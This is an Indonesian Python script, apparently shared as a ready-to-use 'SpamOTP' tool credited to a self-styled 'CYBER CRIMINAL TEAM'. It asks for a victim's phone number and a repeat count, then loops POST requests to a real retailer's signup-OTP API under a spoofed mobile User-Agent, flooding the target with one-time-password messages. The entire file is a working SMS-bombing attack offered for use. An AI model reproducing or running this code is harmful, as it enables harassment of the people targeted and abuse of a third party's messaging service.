#HalloBangSad
#MauRecodeYa?
#Silahkeun:)
import os,sys,time,requests
from requests import post
import subprocess

def bersih():
    os.system("clear")

def balik():
    f = input("\033[1;92m Coba Lagi asw?\033[1;97m (y/t): ")
    if f == "y":
        subprocess.call("python spam.py",shell=True)
    elif f == "t":
        print ("\033[1;91mExit!!\033[1;97m")
        sys.exit()

def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./12)

bersih()

subprocess.call("figlet -f banner MR.414N|lolcat -a",shell=True)
print ("\033[1;96m          SpamOTP \033[1;97mAll Operator")
print ("\033[1;97m_"*50)
print ("Author:\033[1;96mMR.414N")
print ("\033[1;97mwa:\033[1;96m082292838634")
print ("\033[1;98mpesan:\033[1;94mjangan di spam njirr-_-")
print ("\033[1;97mteam :\033[1;92mCYBER CRIMINAL TEAM")
print ("\033[1;96mwhite cyber muslim")
print ("\033[1;92mOFC B.C.T")
print ("\033[1;94mCYBER FR13ND5 TEAM")
print ("\033[1;97m_"*50)
try:
    no = input("\033[1;97m[\033[1;96mMasukan Nomor tergetnya pakek 628 yahh ^_^\033[1;97m]:\033[1;92m")
    jl = int(input("\033[1;97m[\033[1;96mMasukan Jumlah Spam njirr\033[1;97m]:\033[1;92m"))
except KeyboardInterrupt:
       print ("\033[1;91mStop!!\033[1;97m")
       sys.exit()
head = {
"Connection": "keep-alive",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
}
dot = {
"phone": no,
}
print ("\033[1;97m_"*50)
kata("\033[1;93m[\033[1;97m> > > > > > > > >\033[1;93m]")
def kirim():
    time.sleep(1)
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dot, headers=head)
    print ("terkirim:", r.json()["status"])

for i in range(jl):
    try:
        kirim()
    except requests.exceptions.ConnectionError:
           print ("\033[1;91mnyalakan datamu tai!!!!\033[1;97m")
           sys.exit()
balik()
